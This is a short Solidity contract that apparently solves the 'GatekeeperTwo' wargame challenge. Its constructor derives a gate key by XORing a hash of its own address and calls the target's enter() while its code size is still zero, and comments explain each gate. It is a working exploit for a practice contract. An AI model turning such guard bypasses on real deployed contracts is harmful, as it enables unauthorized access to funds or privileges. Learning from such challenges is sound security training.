// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Helper/Broadcasted.sol";

contract GatekeeperTwoAttack is Broadcasted {
    constructor(address payable gateKeeperOneCtr_) {
        uint64 _value = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        );
        bytes8 _key = bytes8(type(uint64).max ^ _value);
        IGateKeeperTwo(gateKeeperOneCtr_).enter(_key);
    }

    function attack(
        address payable gateKeeperOneCtr_
    ) public payable override {}
}

interface IGateKeeperTwo {
    //! gate 1 pass making the calls from a contract
    //! gate 2 calling from the contract constructor (in the ctor the extcodesize is 0)
    //! gate 3 accomplish the logic operations requirements
    function enter(bytes8 _gateKey) external returns (bool);
}
